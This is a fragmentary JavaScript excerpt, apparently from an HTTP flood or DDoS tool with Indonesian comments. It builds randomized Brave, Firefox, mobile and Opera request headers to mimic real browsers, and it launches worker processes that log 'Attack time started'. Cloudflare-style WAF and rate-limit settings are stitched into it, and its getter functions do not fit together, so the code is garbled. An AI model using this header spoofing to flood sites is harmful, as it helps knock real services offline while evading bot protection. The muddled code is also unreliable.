...
const generateBraveHeaders = () => {
    const version = Math.floor(Math.random() * (126 - 121 + 1)) + 121;
...
const generateFirefoxHeaders = () => {
    const version = Math.floor(Math.random() * (112 - 99 + 1)) + 99;
...
const generateMobileHeaders = () => {
    ...
    return [
        ...
        `sec-ch-ua-mobile: ?1`,
        `sec-ch-ua-platform: "${platform}"`,
        `user-agent: Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
        `accept: ${accept}`,
        `sec-fetch-site: ${secFetchSite}`,
        `sec-fetch-mode: ${secFetchMode}`,
        `sec-fetch-user: ${secFetchUser}`,
...
const generateOperaHeaders = () => {
    const version = Math.floor(Math.random() * (90 - 70 + 1)) + 70;
    const secFetchUser = Math.random() < 0.5 ? "?0" : "?1";
    const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
    const secFetchDest = Math.random() < 0.5 ? "document" : "empty";
    const secFetchMode = Math.random() < 0.5 ? "navigate" : "cors";
...
// 1) Origin Shield ( Stabilitas Origin )
const ORIGIN_SHIELD_CONFIG = {
    enabled: true,
    region: "asia-southeast1", // Singapore ( Dekat Indonesia )
};

// 2) Proteksi Penuh Tetap Aktif ( WAF + Bot )
const FULL_PROTECTION_CONFIG = {
    waf: {
        enabled: true,
        managedRules: true,
    },
...
// 3) Rate Limit Lebih Tinggi Untuk Path Tertentu
const HIGH_RATE_LIMIT_ROUTE = {
    expression: '(http.request.uri.path starts_with "/staging/") or (http.request.uri.path starts_with "/qa/")',
    threshold: {
        requests: 500,
        periodSeconds: 60,
    },
    action: "allow",
    description: "Higher Rate Limit For Testing Routes",
};

// 4) Rate Limit Global Tetap Ketat
const GLOBAL_RATE_LIMIT = {
    expression: 'not (http.request.uri.path starts_with "/staging/") and not (http.request.uri.path starts_with "/qa/")',
    threshold: {
        requests: 100,
        periodSeconds: 60,
    },
    action: "managed_challenge",
    description: "Global Protection For All Other Routes",
};

// 5) Urutan Prioritas Rule ( Penting Agar Work )
const RULE_PRIORITY_ORDER = [
    high_rate_limit_route(),
    global_rate_limit(),
    waf_managed_rules(),
    bot_management(),
];

function high_rate_limit_route() {
    return {
        name: "HIGH_RATE_LIMIT_ROUTE",
        expression: '(http.request.uri.path starts_with "/staging/") or (http.request.uri.path starts_with "/qa/")',
        threshold: {
            requests: 500,
            periodSeconds: 60,
...
function waf_managed_rules() {
    return {
        name: "WAF_MANAGED_RULES",
        waf: {
            enabled: true,
            managedRules: true,
            sensitivity: "default",
...
const getHigh_rate_limit_route = (browser) => {
    const settings = high_rate_limit_route();
    return settings[browser] || null;
};

const getGlobal_rate_limit = (browser) => {
    const settings = global_rate_limit();
    return settings[browser] || null;
};

const getWaf_managed_rules = (browser) => {
    const settings = waf_managed_rules();
    return settings[browser] || null;
};

const getBot_management = (browser) => {
    const settings = bot_management();
    return settings[browser] || null;
};
...
const showBrowserSettings = () => {
    ...
    const gethigh_rate_limit_route =getHigh_rate_limit_route(browser);
    const getglobal_rate_limit = getGlobal_rate_limit(browser);
    const getwaf_managed_rules = getWaf_managed_rules(browser);
    const getbot_management = getBot_management(browser);
...
if (cluster.isMaster) {
    ...
    console.log(`Waktu Attack Dimulai :)`);
